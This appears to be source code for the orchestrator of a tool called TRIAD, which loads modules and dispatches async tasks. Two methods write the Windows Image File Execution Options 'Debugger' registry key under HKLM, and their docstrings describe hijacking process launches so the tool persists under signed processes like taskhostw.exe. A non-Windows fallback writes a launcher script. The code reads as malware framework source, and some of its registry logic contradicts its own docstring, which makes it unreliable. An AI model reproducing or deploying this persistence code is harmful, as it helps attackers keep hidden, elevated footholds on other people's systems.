import asyncio
import importlib
import inspect
import sys
import os
# registry operations are a Windows-only concept; on other platforms we use
# configuration files under ~/.config/triad
if os.name == 'nt':
    import winreg
else:
    winreg = None
from typing import List, Dict, Any, Optional, Type
from core.interfaces import BaseModule, BaseEngine
from core.bridge import CommunicationBridge
from core.logger import StructuredLogger
from engines.factory import EngineFactory
from types import ModuleType


class ModuleLoadError(Exception):
    """Raised when a runtime module cannot be imported or instantiated."""

    pass


class TriadOrchestrator:
    """Central orchestration nexus.

    - Manages module execution (non-blocking, exception-safe)
    - Coordinates Bridge events
    - Enforces Bridge-only data flow (modules cannot call engine directly)

    Design notes:

    - Acts as a coordinator only; it does not implement injection logic.
    - Uses dynamic loading (`importlib`) so modules can be developed and
      deployed independently and instantiated at runtime by dotted path.
    - Error handling publishes structured telemetry to the `CommunicationBridge`.
    """

    def __init__(self):
        self._active_tasks: List[asyncio.Task] = []
        self._registry: Dict[str, Any] = {}
        self.is_running: bool = False
        self.bridge = CommunicationBridge()
        self.logger = StructuredLogger()
        self._exception_handlers: Dict[str, callable] = {}
        self._engine: Optional[BaseEngine] = None

    def register_exception_handler(
        self, exception_type: str, handler: callable
    ) -> None:
        """Register custom exception handler for specific exception types."""
        self._exception_handlers[exception_type] = handler

    def select_engine(self, os_type: Optional[str] = None) -> None:
        """Select and initialize the execution engine via EngineFactory."""
        self._engine = EngineFactory.get_engine(os_type)

    def configure_debugger_host(self, host_exe: str = "taskhostw.exe") -> None:
        """Set the Image File Execution Options Debugger for python.exe.

        By writing to the IFEO registry key, TRIAD will be invoked whenever the
        system launches the Python interpreter, causing it to execute under the
        specified signed host (e.g. taskhostw.exe or RuntimeBroker.exe). This
        allows TRIAD to persist in a trusted process hierarchy and maintain
        telemetry even if the original console is closed.
        """
        # key path targets the current python interpreter binary name
        if os.name == 'nt' and winreg:
            key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\python.exe"
            try:
                with winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE) as key:
                    winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ, host_exe)
            except Exception as e:
                # publish an error event but do not raise
                self.bridge.publish_engine_error(
                    target_id="local_system",
                    exception_type="RegistryError",
                    error_code=None,
                    metadata={"message": str(e), "host": host_exe},
                )
        else:
            # Linux/macOS: write a simple launcher script under ~/.config
            cfg = os.path.expanduser("~/.config/triad")
            os.makedirs(cfg, exist_ok=True)
            path = os.path.join(cfg, "debugger_host.sh")
            try:
                with open(path, "w") as f:
                    f.write(f"#!/bin/sh\n{host_exe} &\n")
                os.chmod(path, 0o755)
            except Exception as e:
                self.bridge.publish_engine_error(
                    target_id="local_system",
                    exception_type="PersistenceError",
                    error_code=None,
                    metadata={"message": str(e), "host": host_exe},
                )

    def _ensure_engine(self) -> BaseEngine:
        if not self._engine:
            self.select_engine()
        return self._engine

    def load_module(
        self, dotted_path: str, class_name: Optional[str] = None, **kwargs
    ) -> BaseModule:
        """Dynamically load and instantiate a module given its dotted import path.

        The loader is factory-like: it will attempt to locate a class in the
        module matching `class_name` if provided, otherwise will try to discover
        a `BaseModule` subclass.
        """
        try:
            mod: ModuleType = importlib.import_module(dotted_path)
        except Exception as e:
            raise ModuleLoadError(f"failed to import {dotted_path}: {e}") from e

        target_cls: Optional[Type[BaseModule]] = None

        if class_name and hasattr(mod, class_name):
            target = getattr(mod, class_name)
            if inspect.isclass(target) and issubclass(target, BaseModule):
                target_cls = target

        if not target_cls:
            # discover first BaseModule subclass in module
            for _, obj in inspect.getmembers(mod, inspect.isclass):
                try:
                    if issubclass(obj, BaseModule) and obj is not BaseModule:
                        target_cls = obj
                        break
                except Exception:
                    continue

        if not target_cls:
            raise ModuleLoadError(f"no BaseModule subclass found in {dotted_path}")

        # instantiate: prefer constructor signature (engine, bridge)
        ctor = target_cls
        sig = inspect.signature(ctor.__init__)
        init_kwargs: Dict[str, Any] = {}
        if "engine" in sig.parameters:
            init_kwargs["engine"] = self._ensure_engine()
        if "bridge" in sig.parameters:
            init_kwargs["bridge"] = self.bridge
        init_kwargs.update(kwargs)

        return ctor(**init_kwargs)

    async def dispatch(
        self, module: BaseModule, module_name: str = "unknown"
    ) -> asyncio.Task:
        """
        Dispatch module for non-blocking execution.
        - Wraps with exception handling
        - Publishes errors to Bridge
        - Cleans up task automatically
        """

        async def wrapped_run():
            try:
                await self.logger.info(module_name, "Module dispatch initiated")
                await module.run()
                await self.logger.info(module_name, "Module execution completed")

            except asyncio.CancelledError:
                await self.logger.warning(module_name, "Module execution cancelled")

            except Exception as e:
                error_name = type(e).__name__
                error_msg = str(e)

                # Check if it's engine exception (TriadEngineError, etc)
                if "TriadEngineError" in error_name or "TriadMemoryError" in error_name:
                    await self.bridge.publish_engine_error(
                        target_id="local_system",
                        exception_type=error_name,
                        error_code=getattr(e, "error_code", None),
                        metadata={"module": module_name, "error": error_msg},
                    )
                else:
                    await self.bridge.publish_module_error(
                        module_name=module_name,
                        target_id="local_system",
                        error_message=error_msg,
                        metadata={"exception_type": error_name},
                    )

                await self.logger.error(
                    module_name,
                    "Module execution failed",
                    {"error": error_msg, "type": error_name},
                )

                # Invoke custom handler if registered
                if error_name in self._exception_handlers:
                    try:
                        await self._exception_handlers[error_name](
                            e, module_name, self.bridge
                        )
                    except Exception:
                        pass

        task = asyncio.create_task(wrapped_run())
        self._active_tasks.append(task)
        task.add_done_callback(
            lambda t: self._active_tasks.remove(t) if t in self._active_tasks else None
        )
        return task

    async def run_forever(self) -> None:
        """
        Main event loop: processes Bridge events and maintains orchestration state.
        - Pulls events from Bridge queue
        - Maintains metrics
        - Handles graceful shutdown
        """
        self.is_running = True
        await self.logger.info(
            "orchestrator",
            "Triad nexus initialized",
            {
                "active_modules": len(self._active_tasks),
                "targets": len(self.bridge.get_targets()),
            },
        )

        try:
            while self.is_running:
                event = await self.bridge.pull_event(timeout=1.0)

                if event:
                    await self.logger.debug(
                        "orchestrator",
                        f"Event received: {event.event_type.value}",
                        {
                            "target": event.target_id,
                            "source": event.source_module,
                            "exception": event.exception_type,
                        },
                    )

                await asyncio.sleep(0.05)

        except asyncio.CancelledError:
            await self.logger.warning(
                "orchestrator", "Orchestrator cancellation requested"
            )
        finally:
            await self._cleanup()

    async def _cleanup(self) -> None:
        """
        Graceful shutdown: waits for tasks to complete with timeout.
        Cancels pending tasks after timeout.
        """
        await self.logger.info("orchestrator", "Initiating cleanup sequence")

        if self._active_tasks:
            done, pending = await asyncio.wait(self._active_tasks, timeout=5.0)

            if pending:
                for task in pending:
                    task.cancel()

                try:
                    await asyncio.wait(pending, timeout=2.0)
                except asyncio.TimeoutError:
                    pass

        await self.logger.info(
            "orchestrator",
            "Cleanup complete",
            {"tasks_cleaned": len(self._active_tasks)},
        )

    def configure_ifeo_debugger(self, exe_name: str = "taskhostw.exe", debugger_path: Optional[str] = None) -> None:
        r"""Register TRIAD as a debugger for the given executable via IFEO.

        Writing under
        HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<exe_name>\Debugger
        will cause Windows to spawn our debugger binary whenever the target
        image is executed.  By default we use "taskhostw.exe" as a benign
        signed process to piggy‑back the trust chain.  The caller may supply a
        custom path to the TRIAD executable; otherwise the current Python
        interpreter will be used.
        """
        if debugger_path is None:
            debugger_path = sys.executable

        # build registry key path for Image File Execution Options
        key_path = rf"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{exe_name}"
        try:
            with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
                winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ, debugger_path)
        except PermissionError as e:
            raise RuntimeError("Failed to set IFEO debugger key; requires elevation") from e

    def shutdown(self) -> None:
        """Synchronous teardown signal."""
        self.is_running = False

    def get_status(self) -> Dict[str, Any]:
        """
        Returns current orchestration state snapshot.
        """
        return {
            "is_running": self.is_running,
            "active_modules": len(self._active_tasks),
            "bridge_metrics": self.bridge.get_metrics(),
            "logger_stats": self.logger.get_stats(),
        }
